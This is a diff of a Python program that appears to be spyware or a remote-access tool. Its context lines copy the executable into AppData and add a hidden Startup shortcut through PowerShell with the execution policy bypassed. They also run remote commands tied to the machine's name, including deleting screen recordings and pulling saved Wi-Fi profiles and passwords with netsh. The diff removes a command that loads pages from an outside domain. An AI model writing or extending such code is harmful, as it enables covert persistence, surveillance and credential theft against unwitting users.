@@ -12,7 +12,6 @@ startup_shortcut_path = os.path.join(appdata_roaming, "Microsoft/Windows/Start M
 def create_shortcut():
     os.makedirs(destination, exist_ok=True)
     os.makedirs(screen_recordings_dir, exist_ok=True)
-
     if os.path.abspath(exe) != os.path.abspath(destination_exe) and not os.path.exists(destination_exe):
         shutil.copy2(exe, destination_exe)
         subprocess.Popen([destination_exe], shell=False)
@@ -25,9 +24,7 @@ def create_shortcut():
         $s.TargetPath='{destination_exe}';
         $s.Save()
     """
-
     subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", ps], creationflags=0x08000000)
-
 create_shortcut()
 
 def on_closing():
@@ -72,11 +69,6 @@ if __name__ == "__main__":
                 elif action == f'delete-video':
                     shutil.rmtree(screen_recordings_dir)
                     os.makedirs(screen_recordings_dir)
-                elif action == f'flash-{computer_name}':
-                    window.show()
-                    window.load_url('https://cslckrwbcl.lrdevstudio.com/flash')
-                    time.sleep(20)
-                    window.load_url('https://cslckrwbcl.lrdevstudio.com/success')
                 elif action == f'network-passwords-{computer_name}':
                     networks = []
                     profiles_output = subprocess.check_output((["netsh", "wlan", "show", "profiles"])).decode(errors="ignore")
